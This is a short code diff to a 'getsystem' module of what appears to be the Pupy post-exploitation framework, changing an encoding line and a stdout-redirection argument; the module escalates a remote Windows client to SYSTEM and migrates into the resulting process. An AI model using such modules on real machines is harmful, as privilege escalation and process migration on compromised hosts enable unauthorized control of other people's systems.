@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 from pupylib.PupyModule import *
 from pupylib.utils.rpyc_utils import redirected_stdo
 from modules.lib.windows.migrate import migrate
@@ -12,7 +12,7 @@ class GetSystem(PupyModule):
         self.arg_parser = PupyArgumentParser(prog="getsystem", description=self.__doc__)
 
     def run(self, args):
-        with redirected_stdo(self.client.conn):
+        with redirected_stdo(self):
             proc_pid=self.client.conn.modules["pupwinutils.security"].getsystem()
         migrate(self, proc_pid)
         self.success("got system !")
